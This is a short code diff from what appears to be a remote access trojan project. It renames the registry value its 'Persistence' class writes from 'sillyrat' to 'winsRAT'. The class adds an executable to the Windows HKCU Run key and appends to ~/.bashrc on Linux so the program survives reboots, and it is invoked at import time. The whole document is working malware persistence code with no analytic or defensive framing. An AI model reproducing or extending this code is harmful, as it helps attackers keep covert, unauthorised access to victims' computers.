@@ -9,7 +9,7 @@ class Persistence:
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                                      0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, "sillyrat", 0, winreg.REG_SZ, exe)
+                winreg.SetValueEx(key, "winsRAT", 0, winreg.REG_SZ, exe)
                 winreg.CloseKey(key)
             elif platform.system() == "Linux":
                 rc_path = os.path.expanduser("~/.bashrc")
@@ -29,5 +29,6 @@ class Persistence:
                     f.write(content)
         except Exception as e:
             print(f"[!] Persistence error: {e}")
+
 
 Persistence.install()
